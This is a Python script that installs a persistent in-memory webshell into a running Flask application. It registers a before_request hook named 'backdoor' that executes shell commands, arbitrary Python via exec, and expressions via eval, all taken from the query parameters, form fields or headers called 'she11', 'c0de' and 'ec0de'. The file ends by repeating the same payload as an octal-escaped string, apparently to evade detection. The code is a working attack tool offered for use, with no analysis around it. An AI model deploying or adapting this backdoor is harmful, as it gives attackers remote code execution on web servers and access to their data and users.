#!/usr/bin/env python3
# Copyright (c) 2025 L1ght5t0rm
# Inspired by https://1y0ng.github.io/post/2024/PythonFlask内存马的另辟途径


from flask import current_app
app=current_app
from flask import request
import os                                                                                       #
def backdoor():                                                                                ###
    global app,request,os                                                                      ###
    she11=os.popen(she11).read() if (she11:=request.args.get('she11'))or(she11:=request.form.get('she11'))or(she11:=request.headers.get('she11')) else None
    None if (c0de:=                         request.args.get('c0de'))or(c0de:=request.form.get('c0de'))or(c0de:=request.headers.get('c0de')) else None
    ec0de=ec0de if (ec0de:=request.args.get('ec0de'))or(ec0de:=request.form.get('ec0de'))or(ec0de:=request.headers.get('ec0de')) else None
    if c0de:                                                                                                               #############
        try:                                                                                                            #############
            exec(c0de)                                                                                                #############
            return None                                                                                            #############
        except Exception as e:                                                                                  #############
            return str(e),200,{'Content-Type': 'text/plain'}                                                #############
    if she11:                                                                                            #############
        return she11,200,{'Content-Type': 'text/plain'}                                              #############
    if ec0de:                                                                                     #############
        try:                                                                                   #############
            return str(eval(ec0de)),200,{'Content-Type': 'text/plain'}                      #############
        except Exception as e:                                                           #############
            return str(e),200,{'Content-Type': 'text/plain'}                         #############
_aPpFuNcS=app.before_request_funcs                                              #############
_aPpFuNcS[None]=[i for i in _aPpFuNcS.get(None, []) if 'backdoor' not in i.__name__]
_aPpFuNcS.setdefault(None, []).append(backdoor)

payload=exec('\012\043\040\112\151\156\152\141\123\150\151\160\012\146\162\157\155\040\146\154\141\163\153\040\151\155\160\157\162\164\040\143\165\162\162\145\156\164\137\141\160\160\012\141\160\160\075\143\165\162\162\145\156\164\137\141\160\160\012\146\162\157\155\040\146\154\141\163\153\040\151\155\160\157\162\164\040\162\145\161\165\145\163\164\012\151\155\160\157\162\164\040\157\163\012\144\145\146\040\142\141\143\153\144\157\157\162\050\051\072\012\040\040\040\040\147\154\157\142\141\154\040\141\160\160\054\162\145\161\165\145\163\164\054\157\163\012\040\040\040\040\163\150\145\061\061\075\157\163\056\160\157\160\145\156\050\163\150\145\061\061\051\056\162\145\141\144\050\051\040\151\146\040\050\163\150\145\061\061\072\075\162\145\161\165\145\163\164\056\141\162\147\163\056\147\145\164\050\047\163\150\145\061\061\047\051\051\157\162\050\163\150\145\061\061\072\075\162\145\161\165\145\163\164\056\146\157\162\155\056\147\145\164\050\047\163\150\145\061\061\047\051\051\157\162\050\163\150\145\061\061\072\075\162\145\161\165\145\163\164\056\150\145\141\144\145\162\163\056\147\145\164\050\047\163\150\145\061\061\047\051\051\040\145\154\163\145\040\116\157\156\145\012\040\040\040\040\116\157\156\145\040\151\146\040\050\143\060\144\145\072\075\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\040\162\145\161\165\145\163\164\056\141\162\147\163\056\147\145\164\050\047\143\060\144\145\047\051\051\157\162\050\143\060\144\145\072\075\162\145\161\165\145\163\164\056\146\157\162\155\056\147\145\164\050\047\143\060\144\145\047\051\051\157\162\050\143\060\144\145\072\075\162\145\161\165\145\163\164\056\150\145\141\144\145\162\163\056\147\145\164\050\047\143\060\144\145\047\051\051\040\145\154\163\145\040\116\157\156\145\012\040\040\040\040\145\143\060\144\145\075\145\143\060\144\145\040\151\146\040\050\145\143\060\144\145\072\075\162\145\161\165\145\163\164\056\141\162\147\163\056\147\145\164\050\047\145\143\060\144\145\047\051\051\157\162\050\145\143\060\144\145\072\075\162\145\161\165\145\163\164\056\146\157\162\155\056\147\145\164\050\047\145\143\060\144\145\047\051\051\157\162\050\145\143\060\144\145\072\075\162\145\161\165\145\163\164\056\150\145\141\144\145\162\163\056\147\145\164\050\047\145\143\060\144\145\047\051\051\040\145\154\163\145\040\116\157\156\145\012\040\040\040\040\151\146\040\143\060\144\145\072\012\040\040\040\040\040\040\040\040\164\162\171\072\012\040\040\040\040\040\040\040\040\040\040\040\040\145\170\145\143\050\143\060\144\145\051\012\040\040\040\040\040\040\040\040\040\040\040\040\162\145\164\165\162\156\040\116\157\156\145\012\040\040\040\040\040\040\040\040\145\170\143\145\160\164\040\105\170\143\145\160\164\151\157\156\040\141\163\040\145\072\012\040\040\040\040\040\040\040\040\040\040\040\040\162\145\164\165\162\156\040\163\164\162\050\145\051\054\062\060\060\054\173\047\103\157\156\164\145\156\164\055\124\171\160\145\047\072\040\047\164\145\170\164\057\160\154\141\151\156\047\175\012\040\040\040\040\151\146\040\163\150\145\061\061\072\012\040\040\040\040\040\040\040\040\162\145\164\165\162\156\040\163\150\145\061\061\054\062\060\060\054\173\047\103\157\156\164\145\156\164\055\124\171\160\145\047\072\040\047\164\145\170\164\057\160\154\141\151\156\047\175\012\040\040\040\040\151\146\040\145\143\060\144\145\072\012\040\040\040\040\040\040\040\040\164\162\171\072\012\040\040\040\040\040\040\040\040\040\040\040\040\162\145\164\165\162\156\040\163\164\162\050\145\166\141\154\050\145\143\060\144\145\051\051\054\062\060\060\054\173\047\103\157\156\164\145\156\164\055\124\171\160\145\047\072\040\047\164\145\170\164\057\160\154\141\151\156\047\175\012\040\040\040\040\040\040\040\040\145\170\143\145\160\164\040\105\170\143\145\160\164\151\157\156\040\141\163\040\145\072\012\040\040\040\040\040\040\040\040\040\040\040\040\162\145\164\165\162\156\040\163\164\162\050\145\051\054\062\060\060\054\173\047\103\157\156\164\145\156\164\055\124\171\160\145\047\072\040\047\164\145\170\164\057\160\154\141\151\156\047\175\012\137\141\120\160\106\165\116\143\123\075\141\160\160\056\142\145\146\157\162\145\137\162\145\161\165\145\163\164\137\146\165\156\143\163\012\137\141\120\160\106\165\116\143\123\133\116\157\156\145\135\075\133\151\040\146\157\162\040\151\040\151\156\040\137\141\120\160\106\165\116\143\123\056\147\145\164\050\116\157\156\145\054\040\133\135\051\040\151\146\040\047\142\141\143\153\144\157\157\162\047\040\156\157\164\040\151\156\040\151\056\137\137\156\141\155\145\137\137\135\012\137\141\120\160\106\165\116\143\123\056\163\145\164\144\145\146\141\165\154\164\050\116\157\156\145\054\040\133\135\051\056\141\160\160\145\156\144\050\142\141\143\153\144\157\157\162\051\012')


